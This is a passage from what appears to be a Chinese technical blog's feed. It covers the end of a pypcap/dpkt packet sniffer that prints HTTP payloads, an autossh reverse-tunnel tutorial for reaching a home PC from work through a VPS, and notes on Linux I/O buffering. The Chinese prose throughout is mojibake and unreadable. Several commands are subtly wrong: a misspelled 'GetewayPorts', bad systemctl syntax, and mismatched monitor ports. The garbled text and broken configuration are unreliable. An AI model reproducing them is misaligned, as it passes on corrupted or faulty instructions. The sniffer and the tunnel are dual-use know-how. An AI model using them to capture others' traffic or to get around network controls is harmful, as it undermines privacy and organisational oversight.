    do_not_fragment = bool(ip.off &amp; dpkt.ip.IP_DF)
    more_fragments = bool(ip.off &amp; dpkt.ip.IP_MF)
    fragment_offset = ip.off &amp; dpkt.ip.IP_OFFMASK

    print(&#39;IP: %s -&gt; %s (len=%d ttl=%d DF=%d MF=%d offset=%d)\n&#39; % (
        ip_addr(ip.src), ip_addr(ip.dst), ip.len, ip.ttl,
        do_not_fragment, more_fragments, fragment_offset))

def anlysisData(data):
    packet = dpkt.ethernet.Ethernet(data)
    if isinstance(packet.data, dpkt.ip.IP):
        ip = ip_addr(packet.data.dst)
        if packet.data.data.dport == 80 or packet.data.data.sport == 80:
            try:
                print(packet.data.data.data.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;))
            except UnicodeDecodeError as uderr:
                print(uderr.__str__())


def main():
    if &#39;Windows&#39; in platform.platform():
        iface = getInterfaceByName(&#39;Router&#39;)
    else:
        iface = &#39;enp2s0&#39;
    captureData(iface)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h3 id="ç®€è¦è¯´æ˜"><a href="#ç®€è¦è¯´æ˜" class="headerlink" title="ç®€è¦è¯´æ˜"></a>ç®€è¦è¯´æ˜</h3><ul>
<li>è·å–æ¥å£</li>
</ul>
<p><code>getInterfaceByName</code>æ ¹æ®æ¥å£åç§°,é€šè¿‡æŸ¥æ‰¾æ³¨å†Œè¡¨ä¿¡æ¯è·å–<code>pcap</code>æ‰€éœ€çš„æ¥å£è®¾å¤‡ä¿¡æ¯,é€‚ç”¨äºWindowsç³»ç»Ÿ.è‡³äºLinuxç³»ç»Ÿ,ç›´æ¥é€šè¿‡<code>ifconfig</code>è·å–å³å¯,è‡³äºè‡ªåŠ¨è·å–åŠŸèƒ½,ç›®å‰è¿˜æ²¡å†™,ä»¥åå†è¯´å§.</p>
<ul>
<li>æ•°æ®åŒ…å­˜å‚¨</li>
</ul>
<p>ä¸ºäº†å°†æ•°æ®åŒ…å­˜å‚¨åˆ°<code>.pcap</code>æ–‡ä»¶(æ­¤ç±»æ–‡ä»¶å¯ä»¥ä½¿ç”¨wiresharkæ‰“å¼€)ä¸­,å¯ä»¥é€šè¿‡<code>dpkt.pcap.Writer</code>å¯¹è±¡ä½¿ç”¨<code>writepkt</code>å‡½æ•°ä¸æ–­å†™å…¥æ–‡ä»¶.</p>
<pre><code class="py">pcap_file = open(pcap_filepath, &#39;wb&#39;)
writer = dpkt.pcap.Writer(pcap_file)
for ptime, pdata in pkt:
    writer.writepkt(pdata, ptime)
</code></pre>
<ul>
<li>æ‰“å°æ•°æ®åŒ…åŸºæœ¬ä¿¡æ¯</li>
</ul>
<p><code>printRawPkt</code>æ˜¯ä¸ªéå¸¸ç®€å•çš„æ‰“å°æ•°æ®åŒ…åŸºæœ¬ä¿¡æ¯çš„å‡½æ•°,æœ€å¤šä»…æ‰“å°è‡³<code>ip</code>ä¿¡æ¯,æ‰“å°æ ¼å¼å¦‚ä¸‹:</p>
<pre><code class="yml">Timestamp:  2018-12-31 13:58:39.850904
Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00
IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)
</code></pre>
<p>ä¿¡æ¯åŒ…å«æ—¶é—´æˆ³,ä»¥å¤ªç½‘å¸§çš„<code>MAC</code>åœ°å€,<code>IP</code>åœ°å€åŠåˆ†ç‰‡ä¿¡æ¯ç­‰.</p>
<ul>
<li>è§£æhttpæ•°æ®åŒ…</li>
</ul>
<p><code>anlysisData</code>å‡½æ•°ç›®å‰åªæ˜¯ç®€å•çš„æ£€æµ‹åŠæ‰“å°è§£ç åçš„<code>http</code>åŒ…,ä½¿ç”¨<code>dpkt.ethernet.Ethernet</code>å¯ä»¥å°†åŸå§‹æ•°æ®åŒ…å°è£…æˆä¸€ä¸ªç»“æ„åŒ–çš„ä»¥å¤ªç½‘å¸§,ä¹‹åæŒ‰ç…§ç½‘ç»œåè®®æ ˆçš„é¡ºåºä¾¿å¯é€å±‚è§£æå‡ºé“¾è·¯å±‚ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ç›´è‡³åº”ç”¨å±‚.ä»¥ä¸Šä»£ç å…ˆæ˜¯åˆ¤æ–­æ˜¯å¦ä¸º<code>IP</code>æŠ¥æ–‡,ä¹‹åæ ¹æ®ç«¯å£å·åˆ¤æ–­æ˜¯å¦ä¸ºhttpæŠ¥æ–‡,ç„¶åå°†æ•°æ®è§£ç åè¾“å‡º.</p>
<p>è¿™ä¸ªä¾‹å­ä¹Ÿå¾ˆç®€å•,å¾ˆå¤šå¼‚å¸¸æƒ…å†µä¹Ÿæ²¡è€ƒè™‘,æœ¬æ–‡ä¸»è¦ç›®çš„æ˜¯æè¿°<code>pypcap</code>å’Œ<code>dpkt</code>çš„å¸¸ç”¨æ–¹æ³•ä»¥åŠæŠ“åŒ…å·¥å…·çš„å®ç°è¿‡ç¨‹,è‡³äºé’ˆå¯¹å…·ä½“åè®®çš„è§£æåˆ™éœ€ç»§ç»­å­¦ä¹ .</p>
<h3 id="æŠ“åŒ…æµ‹è¯•"><a href="#æŠ“åŒ…æµ‹è¯•" class="headerlink" title="æŠ“åŒ…æµ‹è¯•"></a>æŠ“åŒ…æµ‹è¯•</h3><pre><code class="zsh">âœ mkdir pkts
âœ sudo ./pktcap.py
Start capture...
Timestamp:  2018-12-31 13:58:37.148964
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.148978
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.529024
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.809011
Ethernet Frame:  98:e0:d9:a4:50:1d 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:39.850904
Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00
IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)

Timestamp:  2018-12-31 13:58:39.862890
Ethernet Frame:  00:0f:e9:61:30:00 00:e0:4c:5a:0a:78
IP: 59.111.160.197 -&gt; 192.168.1.76 (len=40 ttl=55 DF=1 MF=0 offset=0)

Timestamp:  2018-12-31 13:58:40.289465
Ethernet Frame:  b0:19:c6:17:0a:57 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:40.369068
Ethernet Frame:  a4:d1:8c:0b:54:12 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:41.859034
Ethernet Frame:  a0:4e:a7:e0:65:3d 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:42.079218
Ethernet Frame:  8c:6d:50:7d:f9:fc ff:ff:ff:ff:ff:ff
IP: 0.0.0.0 -&gt; 255.255.255.255 (len=352 ttl=64 DF=0 MF=0 offset=0)

^C10 packets received
âœ cd pkts
âœ ls
pkts_20181230-185017.pcap  pkts_20181231-203416.pcap  pkts_20181231-215837.pcap
</code></pre>
<p>ä»£ç å·²ä¸Šä¼ è‡³<a href="https://github.com/Litreily/Python-demos.git" target="_blank" rel="noopener">github Python-demos</a> <code>sniffer.py</code></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="https://www.cnblogs.com/jackadam/p/8279080.html" target="_blank" rel="noopener">windows ç¯å¢ƒä¸‹python å®‰è£… pypcap...</a></li>
<li><a href="https://www.cnblogs.com/xuanhun/p/5625186.html" target="_blank" rel="noopener">Pythoné»‘å®¢ç¼–ç¨‹3ç½‘ç»œæ•°æ®ç›‘å¬å’Œè¿‡æ»¤</a></li>
<li><a href="https://blog.csdn.net/weixin_39138707/article/details/74612637" target="_blank" rel="noopener">Macä¸‹ç”¨python+pypcap+dpktæŠ“å–IPæ•°æ®åŒ…å¹¶åˆ†æ</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pypcap </tag>
            
            <tag> dpkt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[autosshåå‘ä»£ç†å®ç°å†…ç½‘ç©¿é€]]></title>
      <url>https://www.litreily.top/2018/11/25/autossh/</url>
      <content type="html"><![CDATA[<p>æœ‰æ—¶å€™éœ€è¦åœ¨å…¬å¸ä½¿ç”¨å®¶é‡Œä¸ªäººPCçš„ä¸€äº›èµ„æºï¼Œæ­¤æ—¶å¯ä»¥é€‰æ‹©<code>Teamvieawer</code>è¿›è¡Œè¿œç¨‹ï¼Œä½†æ˜¯ç•¥å¾®éº»çƒ¦è€Œä¸”è®¿é—®é€Ÿç‡è¾ƒæ…¢ï¼Œæ­¤æ—¶é€šè¿‡<code>vps</code>å®ç°å†…ç½‘ç©¿é€å°±æ˜¯ä¸ªä¸é”™çš„æƒ³æ³•ã€‚</p>
<p><img src="/assets/proxy/autossh_proxy.svg" alt="vps proxy"></p>
<p>æœ¬æ–‡è®²è¿°çš„å†…ç½‘ç©¿é€æ–¹æ³•æ˜¯é€šè¿‡<code>autossh</code>å®ç°vpså¯¹å†…ç½‘çš„åå‘ä»£ç†ï¼Œåœ¨vpsä¸å†…ç½‘ä¹‹é—´å»ºç«‹ä¸€æ¡é•¿è¿æ¥ï¼Œä½¿å¾—å¤–ç½‘PCé€šè¿‡vpsçš„åå‘ä»£ç†è®¿é—®å†…ç½‘PCã€‚æ•´ä¸ªå®ç°æ‰€éœ€çš„æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ol>
<li>å¸¦æœ‰å…¬ç½‘IP(<code>222.222.222.222</code>)çš„vps</li>
<li>ä¿æŒå¼€æœºä¸”è”ç½‘çš„å†…ç½‘PC</li>
<li>ä»»ä¸€è”ç½‘çš„å¤–ç½‘PC</li>
</ol>
<a id="more"></a>
<h2 id="vpsé…ç½®"><a href="#vpsé…ç½®" class="headerlink" title="vpsé…ç½®"></a>vpsé…ç½®</h2><p>ä¿®æ”¹vpsçš„æ–‡ä»¶<code>/etc/ssh/sshd_config</code>, å–æ¶ˆä»¥ä¸‹å‚æ•°çš„æ³¨é‡Šæˆ–æ˜¯ä¿®æ”¹å…¶å€¼</p>
<pre><code class="yml">GetewayPorts yes
TCPKeepAlive yes
ClientAliveInterval 60
ClientAliveCountMax 3
</code></pre>
<h2 id="å†…ç½‘PCé…ç½®"><a href="#å†…ç½‘PCé…ç½®" class="headerlink" title="å†…ç½‘PCé…ç½®"></a>å†…ç½‘PCé…ç½®</h2><p>ä¸ºäº†ä¿è¯å†…ç½‘PCå¯ä»¥å…å¯†ç è®¿é—®vpsï¼Œéœ€è¦åœ¨vpsæ·»åŠ å†…ç½‘PCçš„å…¬é’¥</p>
<pre><code class="sh">$ ssh-keygen
# ... enter ...
$ ssh-copy-id -i ~/.ssh/id_rsa.pub -p 27000 root@222.222.222.222
# 27000æ˜¯è®¿é—®vpsçš„ç«¯å£å·ï¼Œrootæ˜¯vpsçš„ç”¨æˆ·åï¼Œ222.222.222.222æ˜¯vpsçš„å…¬ç½‘IP
</code></pre>
<p>é…ç½®å¥½åï¼Œåœ¨å†…ç½‘PCå®‰è£…<code>autossh</code></p>
<pre><code class="sh">sudo apt-get install -y autossh
</code></pre>
<p>å®‰è£…å¥½ä»¥åï¼Œé€šè¿‡ä»¥ä¸ŠæŒ‡ä»¤ä¾¿å¯å®ç°åå‘ä»£ç†ï¼š</p>
<pre><code class="sh">autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222
</code></pre>
<p>å…¶ä¸­çš„å‚æ•°ï¼š</p>
<ul>
<li><code>-p 27000</code>: vps ssh ç«¯å£ï¼Œé»˜è®¤å€¼22</li>
<li><code>-M 27440</code>: ä¸­ç»§æœåŠ¡å™¨ï¼ˆvpsï¼‰çš„ä»£ç†æœåŠ¡ç›‘å¬ç«¯å£ï¼Œéœ€ä¿è¯ä¸è¢«vpså…¶å®ƒè¿›ç¨‹å ç”¨</li>
<li><code>-NR &#39;*:27401:localhost:27402&#39;</code>: ç«¯å£æ˜ å°„ï¼Œvpsçš„<code>27401</code>ç«¯å£æ˜ å°„åˆ°å†…ç½‘PCçš„<code>27402</code>ç«¯å£</li>
<li><a href="mailto:`root@222.222.222.222" target="_blank" rel="noopener">`root@222.222.222.222</a>`: vpsçš„ç”¨æˆ·ååŠIP</li>
</ul>
<p>è¿™é‡Œæ¶‰åŠåˆ°4ä¸ªç«¯å£ï¼Œ<code>27000</code>æ˜¯vps sshçš„ç›‘å¬ç«¯å£ï¼Œ<code>27400</code>æ˜¯vpsä»£ç†æœåŠ¡çš„ç›‘å¬ç«¯å£ï¼Œ<code>27401</code>å’Œ<code>27402</code>æ˜¯vpsä¸å†…ç½‘PCä¹‹é—´çš„ä¸€å¯¹ç«¯å£æ˜ å°„ï¼Œå¤–ç½‘PCéœ€è¦é€šè¿‡vpsçš„<code>27401</code>ç«¯å£è®¿é—®å†…ç½‘ã€‚</p>
<h3 id="é…ç½®autosshæœåŠ¡"><a href="#é…ç½®autosshæœåŠ¡" class="headerlink" title="é…ç½®autosshæœåŠ¡"></a>é…ç½®autosshæœåŠ¡</h3><p>ä½¿ç”¨ä»¥ä¸ŠæŒ‡ä»¤å·²ç»å¯ä»¥å®Œæˆæ‰€éœ€çš„åŠŸèƒ½äº†ï¼Œä½†æ˜¯æ¯æ¬¡å¼€æœºéƒ½å¾—é‡æ–°è¾“ä¸€éï¼Œå¾ˆä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥å¯ä»¥æŠŠæŒ‡ä»¤å°è£…æˆä¸€ä¸ªæœåŠ¡ï¼Œç„¶åè®¾ç½®ä¸ºå¼€æœºå¯åŠ¨ã€‚åœ¨<code>ubuntu</code>ä¸­ï¼Œå¯ä»¥åœ¨<code>lib/systemd/system</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>autossh.service</code>çš„æ–‡ä»¶ï¼Œå¹¶è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="yml">[Unit]
Description=Auto SSH Tunnel
After=network-online.target
[Service]
User=autossh
Type=simple
ExecStart=/usr/bin/autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222 -i ~/.ssh/id_rsa
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
StartLimitIntervalSec=5
StartLimitBurst=12
Restart=always
[Install]
WantedBy=multi-user.target
WantedBy=graphical.target
</code></pre>
<p>é…ç½®å¥½åï¼Œé€šè¿‡ä»¥ä¸‹æŒ‡ä»¤å®Œæˆå¯åŠ¨ã€æŸ¥è¯¢å’Œè‡ªå¯åŠ¨ã€‚</p>
<ul>
<li>å¯åŠ¨æœåŠ¡ï¼š<code>sudo systemctl autossh start</code></li>
<li>æŸ¥çœ‹çŠ¶æ€ï¼š<code>sudo service autossh status</code></li>
<li>å¼€æœºå¯åŠ¨ï¼š<code>sudo systemctl enable autossh.service</code></li>
</ul>
<h2 id="è¿œç¨‹è®¿é—®å†…ç½‘"><a href="#è¿œç¨‹è®¿é—®å†…ç½‘" class="headerlink" title="è¿œç¨‹è®¿é—®å†…ç½‘"></a>è¿œç¨‹è®¿é—®å†…ç½‘</h2><p>æœ€åå°±æ˜¯å¦‚ä½•é€šè¿‡å¤–ç½‘è®¿é—®å†…ç½‘äº†ï¼Œå…¶å®å’Œè®¿é—®vpsæœ¬èº«ç±»ä¼¼ï¼Œä»…ä»…æ˜¯æ”¹ä¸€ä¸‹è¿æ¥ç«¯å£å³å¯ã€‚</p>
<pre><code class="sh">sudo ssh root@222.222.222.222 -p 27401
</code></pre>
<h2 id="æ‰©å±•è¯´æ˜"><a href="#æ‰©å±•è¯´æ˜" class="headerlink" title="æ‰©å±•è¯´æ˜"></a>æ‰©å±•è¯´æ˜</h2><p>æœ¬æ–‡ä»‹ç»çš„æ˜¯é€šè¿‡vpså®ç°åå‘ä»£ç†ï¼Œå¦‚æœæ²¡æœ‰vpsçš„è¯å°±æ— æ³•ä½¿ç”¨äº†ï¼Œæ­¤æ—¶å¯ä»¥å­¦ä¹ ä¸‹<code>frp</code>æˆ–<code>Ngrok</code>ï¼Œä½¿ç”¨å…¬å…±çš„æœåŠ¡å™¨å®ç°ä»£ç†ï¼</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://blog.windrunner.me/sa/reverse-ssh.html" target="_blank" rel="noopener">ä½¿ç”¨ autossh å»ºç«‹åå‘ SSH éš§é“ç®¡ç†ä¸ªäººè®¡ç®—æœº</a></li>
<li><a href="https://www.cnblogs.com/eshizhan/archive/2012/07/16/2592902.html" target="_blank" rel="noopener">SSHåå‘è¿æ¥åŠAutossh</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
            <tag> proxy </tag>
            
            <tag> vps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linuxä¸­çš„æ–‡ä»¶I/Oç¼“å†²]]></title>
      <url>https://www.litreily.top/2018/10/25/io-cache/</url>
      <content type="html"><![CDATA[<p>è¿‘æ—¥é˜…è¯»ã€ŠLinux/UNIXç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ç¬¬13ç«  - æ–‡ä»¶I/Oç¼“å†²ï¼Œæœ‰äº›æ”¶è·ï¼Œæ˜¯ä»¥æ­¤æ–‡ä»¥è®°ä¹‹ã€‚ä»¥å¾€åªçŸ¥é“Linuxçš„I/Oæ“ä½œæœ‰ç¼“å†²æœºåˆ¶ï¼Œä½†å§‹ç»ˆä¸çŸ¥é“å…·ä½“çš„ç¼“å†²æµç¨‹åŠä½¿ç”¨æ–¹æ³•ã€‚è¯»å®Œæœ¬ç« èŠ‚åæ–¹æ‰æœ‰ç§æç„¶å¤§æ‚Ÿçš„æ„Ÿè§‰ï¼Œä¹…è¿çš„å› è¯»ä¹¦è€Œè§‰å¾—èˆ’çˆ½çš„æ„Ÿè§‰ã€‚</p>
<p>å¥½äº†ï¼Œè¿›å…¥æ­£é¢˜ï¼Œä¸‹å›¾æ‘˜è‡ªåŸæ–‡(13.4-I/Oç¼“å†²å°ç»“)ï¼Œæ­¤å›¾æ¦‚æ‹¬äº†<code>stdio</code>åº“åŠå†…æ ¸é’ˆå¯¹è¾“å‡ºæ–‡ä»¶æ‰€ç”¨çš„ç¼“å†²ä»¥åŠå„ç±»ç¼“å†²çš„æ§åˆ¶æœºåˆ¶ã€‚æœ¬æ–‡ä¾æ®æ­¤å›¾é€æ­¥æ­å¼€æ–‡ä»¶I/Oç¼“å†²çš„é¢çº±ã€‚</p>
<p><img src="/assets/linux/io_buffer.jpg" alt="I/Oç¼“å†²"></p>
<a id="more"></a>
<h2 id="I-Oç¼“å†²çš„ç±»å‹"><a href="#I-Oç¼“å†²çš„ç±»å‹" class="headerlink" title="I/Oç¼“å†²çš„ç±»å‹"></a>I/Oç¼“å†²çš„ç±»å‹</h2><p>åœ¨ä½¿ç”¨<code>stdio</code>åº“ä¸­æ–‡ä»¶å†™æ“ä½œç›¸å…³çš„å‡½æ•°ï¼ˆå¦‚:<code>printf</code>, <code>fputc</code>, <code>fputs</code>, <code>fwrite</code>ï¼‰æ—¶ï¼Œå¾…å†™å…¥æ•°æ®ä»ç”¨æˆ·ç©ºé—´å†…å­˜åˆ°å†…æ ¸ç©ºé—´å†…å­˜ã€å†åˆ°ç£ç›˜ä¼šç»è¿‡ä»¥ä¸‹3ç±»ç¼“å†²</p>
<ol>
<li>stdioåº“çš„ç¼“å†²åŒº</li>
<li>æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²åŒºçš„é«˜é€Ÿç¼“å­˜</li>
<li>ç£ç›˜é©±åŠ¨å™¨å†…ç½®é«˜é€Ÿç¼“å­˜</li>
</ol>
<p>ä¸‹é¢é€ä¸€ä»‹ç»ã€‚</p>
<h3 id="stdioåº“çš„ç¼“å†²"><a href="#stdioåº“çš„ç¼“å†²" class="headerlink" title="stdioåº“çš„ç¼“å†²"></a>stdioåº“çš„ç¼“å†²</h3><p><img src="/assets/linux/stdio_buffer.png" alt="stdio buffer"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ<code>stdio</code>åº“å®ç°çš„ç¼“å†²ä½äºç”¨æˆ·ç©ºé—´å†…å­˜å½“ä¸­ï¼Œè¯¥ç¼“å†²åŒºAä¼šç¼“å†²å¤§å—çš„æ–‡ä»¶æ•°æ®ä»¥å‡å°‘ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚: <code>read</code>, <code>write</code>ï¼‰ã€‚</p>
<p>éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œ<code>stdio</code>åº“å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨åº•å±‚çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚<code>fgets</code>è°ƒç”¨<code>read</code>ï¼Œ<code>fputs</code>è°ƒç”¨<code>write</code>ã€‚ä½†æ˜¯åœ¨è°ƒç”¨ä¹‹å‰ï¼Œ</p>
<ul>
<li>å¯¹äºè¯»æ“ä½œï¼Œåº“å‡½æ•°ä¼šå…ˆæ£€æŸ¥ç¼“å†²åŒºAå†…æ˜¯å¦å·²æœ‰æ‰€éœ€æ•°æ®ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥ä»ç¼“å†²åŒºAè¯»å–ï¼›å¦åˆ™å…ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨<code>read</code>ï¼Œä»å†…æ ¸ç¼“å†²åŒºBä¸­è¯»å–æ•°æ®åˆ°ç¼“å†²åŒºAï¼Œç„¶åä»ç¼“å†²åŒºAè¯»å–æ•°æ®</li>
<li>å¯¹äºå†™æ“ä½œï¼Œåº“å‡½æ•°ä¼šå…ˆæ£€æŸ¥ç¼“å†²åŒºAæ˜¯å¦è¿˜æœ‰ç©ºé—²ï¼Œå¦‚æœæœ‰åˆ™å…ˆå­˜å…¥ç¼“å†²åŒºAï¼›å¦åˆ™å…ˆæ‰§è¡Œåº“å‡½æ•°<code>fflush</code>ï¼Œå°†ç¼“å†²åŒºAä¸­æ•°æ®åˆ·æ–°è‡³å†…æ ¸ç¼“å†²åŒºBï¼Œç„¶åå°†å½“å‰å¾…å†™å…¥æ•°æ®å†™å…¥ç¼“å†²åŒºA</li>
</ul>
<p>å¯¹äº<code>stdio</code>åº“çš„ç¼“å†²æ•°æ®ï¼Œåœ¨æ‰§è¡Œåº“å‡½æ•°ä¹‹åçš„æŸä¸€æ—¶åˆ»ï¼Œç³»ç»Ÿä¼šé€šè¿‡<code>fflush</code>å‡½æ•°å°†æ•°æ®åˆ·æ–°è‡³å†…æ ¸ç¼“å†²åŒºã€‚å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ‰§è¡Œ<code>fflush</code>å‡½æ•°å¼ºåˆ¶åˆ·æ–°æ•°æ®è‡³å†…æ ¸ç¼“å†²åŒºã€‚</p>
<p><code>fflush</code>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="c">#include &lt;stdio.h&gt;
int fflush(FILE *stream);
</code></pre>
<ul>
<li><code>fflush(stdin)</code>ä¼šæ¸…ç©ºç¼“å†²åŒºå†…çš„æ ‡å‡†è¾“å…¥æ•°æ®</li>
<li><code>fflush(stdout)</code>ä¼šå°†ç¼“å†²åŒºå†…çš„å†™å…¥æ•°æ®åˆ·æ–°è‡³ç»ˆç«¯è¾“å‡º</li>
<li><code>stderr</code>é»˜è®¤ä¸ä½¿ç”¨ç¼“å†²</li>
<li><code>fflush(stream)</code>å°†æ–‡ä»¶æµ<code>stream</code>çš„ç¼“å†²æ•°æ®åˆ·æ–°è‡³å†…æ ¸ç¼“å†²åŒº</li>
</ul>
<h3 id="æ–‡ä»¶I-Oçš„å†…æ ¸ç¼“å†²"><a href="#æ–‡ä»¶I-Oçš„å†…æ ¸ç¼“å†²" class="headerlink" title="æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²"></a>æ–‡ä»¶I/Oçš„å†…æ ¸ç¼“å†²</h3><p>ä¸ç®¡ä½¿ä¸ä½¿ç”¨<code>stdio</code>åº“å‡½æ•°ï¼Œæœ€ç»ˆéƒ½ä¼šç›´æ¥æˆ–é—´æ¥çš„è°ƒç”¨<code>open</code>, <code>read</code>, <code>write</code>, <code>lseek</code>ç­‰ç³»ç»Ÿè°ƒç”¨è¯»å†™æ–‡ä»¶I/Oï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¼šåœ¨å†™æ“ä½œåå°†æ•°æ®å­˜å…¥å†…æ ¸ç¼“å†²åŒºï¼Œä½†æ­¤æ—¶è¿˜å¹¶æœªå­˜å…¥ç£ç›˜ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ‰§è¡Œ<code>write</code>åï¼Œå‡½æ•°ç›´æ¥è¿”å›ï¼Œä½†æ•°æ®åªæ˜¯å­˜åœ¨å†…æ ¸ç¼“å†²åŒºä¸­ã€‚å½“æœ‰æ–°çš„è¯»å–è¯·æ±‚æ—¶ï¼Œä¼šå…ˆåœ¨å†…æ ¸ç¼“å†²åŒºä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥è¿”å›ï¼›å¦‚æœæ²¡æœ‰åˆ™å…ˆä»ç£ç›˜è¯»å…¥å¤§å—æ•°æ®è‡³å†…æ ¸ç¼“å†²åŒºï¼Œè¿™æ ·å¯ä»¥å‡å°‘ç£ç›˜è¯»å†™æ“ä½œã€‚æ¯•ç«Ÿï¼Œç›¸æ¯”äºç³»ç»Ÿè°ƒç”¨å’Œç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„æ•°æ®ä¼ è¾“ï¼Œç£ç›˜è¯»å†™æ‰€èŠ±è´¹çš„æ—¶é—´è¦é•¿å¾—å¤šã€‚</p>
<blockquote>
<p>è‹¥å†…å®¹å‘ç”Ÿå˜åŒ–çš„å†…æ ¸ç¼“å†²åŒºåœ¨30så†…æœªç»æ˜¾å¼æ–¹å¼åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œåˆ™ä¸€æ¡é•¿æœŸè¿è¡Œçš„å†…æ ¸çº¿ç¨‹ä¼šç¡®ä¿å°†å…¶åˆ·æ–°åˆ°ç£ç›˜ä¸Šã€‚</p>
</blockquote>
<p>ä¸åŒç‰ˆæœ¬çš„<code>linux</code>ï¼Œå…¶å†…æ ¸çº¿ç¨‹ä¸ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨æŒ‡ä»¤<code>ps aux |grep flush</code>ç²—ç•¥æŸ¥çœ‹ä¸€ä¸‹ã€‚</p>
<pre><code class="bash"># æŸ¥çœ‹å†…æ ¸çº¿ç¨‹åˆ·æ–°ä¹‹å‰è„ç¼“å†²åŒºå¿…é¡»è¾¾åˆ°çš„æ—¶é—´ï¼Œå•ä½ï¼š0.01s
$ cat /proc/sys/vm/dirty_expire_centisecs
3000

# æŸ¥çœ‹å†…æ ¸çº¿ç¨‹æ‰§è¡Œå‘¨æœŸï¼Œå•ä½ï¼š0.01s
$ cat /proc/sys/vm/dirty_writeback_centisecs
500
</code></pre>
<h3 id="ç£ç›˜é©±åŠ¨å™¨å†…ç½®ç¼“å†²"><a href="#ç£ç›˜é©±åŠ¨å™¨å†…ç½®ç¼“å†²" class="headerlink" title="ç£ç›˜é©±åŠ¨å™¨å†…ç½®ç¼“å†²"></a>ç£ç›˜é©±åŠ¨å™¨å†…ç½®ç¼“å†²</h3><p>å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®åœ¨çœŸæ­£å­˜å…¥ç‰©ç†ç£ç›˜å‰ï¼Œä¼šå…ˆå­˜å…¥ç£ç›˜é©±åŠ¨å™¨å†…ç½®çš„é«˜é€Ÿç¼“å­˜ï¼Œä¹‹ååœ¨æŸä¸€æ—¶åˆ»å†™å…¥ç£ç›˜ã€‚å…·ä½“è¿‡ç¨‹æ²¡æœ‰æ·±ç©¶è¿‡ï¼Œç›®å‰åªéœ€çŸ¥é“è¿˜æœ‰è¿™ä¹ˆä¸€å±‚ç¼“å†²åŒºå³å¯ã€‚</p>
<h2 id="æ§åˆ¶æ–‡ä»¶I-Oç¼“å†²"><a href="#æ§åˆ¶æ–‡ä»¶I-Oç¼“å†²" class="headerlink" title="æ§åˆ¶æ–‡ä»¶I/Oç¼“å†²"></a>æ§åˆ¶æ–‡ä»¶I/Oç¼“å†²</h2><p>é€šè¿‡æŸäº›æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶I/Oç¼“å†²æœºåˆ¶ï¼Œå…¶ä¸­åŒ…æ‹¬ä¿®æ”¹ç¼“å†²åŒºå¤§å°ã€ç¼“å†²æ¨¡å¼ï¼Œç¦ç”¨ç¼“å†²ï¼Œå¼ºåˆ¶åˆ·æ–°ç¼“å†²æ•°æ®ç­‰ã€‚</p>
